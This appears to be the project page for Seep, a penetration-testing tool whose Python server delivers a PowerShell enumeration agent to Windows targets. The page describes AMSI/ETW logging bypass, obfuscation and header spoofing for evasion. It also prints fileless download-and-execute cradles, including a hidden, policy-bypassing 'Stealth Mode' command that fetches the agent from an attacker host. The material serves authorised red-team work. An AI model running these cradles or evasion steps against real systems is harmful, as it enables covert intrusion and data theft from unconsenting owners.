// architecture

Two components. Zero bloat.

A Python CLI on the attack box orchestrates everything. A composed PowerShell agent runs on the target and reports back.

system architecture
01

Agent Composer

Assembles 16 independent PowerShell modules into a single .ps1 agent with AMSI/ETW/SBL bypass. Select checks with --checks, apply identifier randomization with --obfuscate, auto-invoke with embedded auth.

02

HTTP Server

Stdlib http.server — no Flask, no FastAPI. Auth-gated agent delivery, AES-256-CBC encrypted result upload, IIS/10.0 header spoofing, random TLS CN, and URL prefix support.

03

Results Parser

Accepts AES-256-CBC encrypted, GZip, ZIP, and JSON uploads. 50MB upload limit, 200MB decompression limit. Schema validation, decompression bomb protection, and path traversal guards.

04

Report Engine

Recommendation engine maps findings to MITRE ATT&CK techniques. Generates self-contained HTML, Markdown, and JSON reports. Zero external dependencies in output.

Python 3.9+ PowerShell 3.0+ argparse http.server pyyaml cryptography ThreadPoolExecutor OpenSSL
// examples

Serve. Execute. Report.

Initialize a workspace, serve the agent, execute on target, generate reports. The CLI handles everything.

Fileless Execution
PS> IEX(New-Object Net.WebClient).DownloadString('http://KALI/agent.ps1?token=T')
# Agent auto-invokes with embedded token
Custom Agent
$ seep compose --checks system_info,user_privileges,services
$ seep compose --obfuscate -o agent.ps1
Generate Report
$ seep report results.json --format html -o report.html
Tool Management
$ seep catalog download --all -w /tmp/op1
$ seep catalog verify -w /tmp/op1
Stealth Mode
PS> powershell -ep bypass -NoP -W Hidden -c "IEX(...agent.ps1?token=T...)"
TLS Server
$ seep serve --tls -w /tmp/op1
// quickstart

Running in 60 seconds

Install, initialize, serve, execute. One pip install and you're ready for enumeration.

bash
# Install via pipx (recommended)
$ pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git
# Initialize & serve
$ seep init -w /tmp/op1
$ seep serve -w /tmp/op1
# On target (fileless)
PS> IEX(...); Invoke-Seep
# Generate report
$ seep report /tmp/op1/results/*.json -o report.html

pipx install installs Seep in an isolated environment and makes the seep CLI available globally. Install from GitHub or a local clone.

seep init creates the workspace directory structure — config, results directory, and tool storage. Everything is isolated per engagement.

seep serve starts an HTTP server with auth-gated agent delivery, AES-encrypted result upload, and IIS header spoofing. Prints ready-to-use cradles with auth tokens on startup. Add --tls for HTTPS.
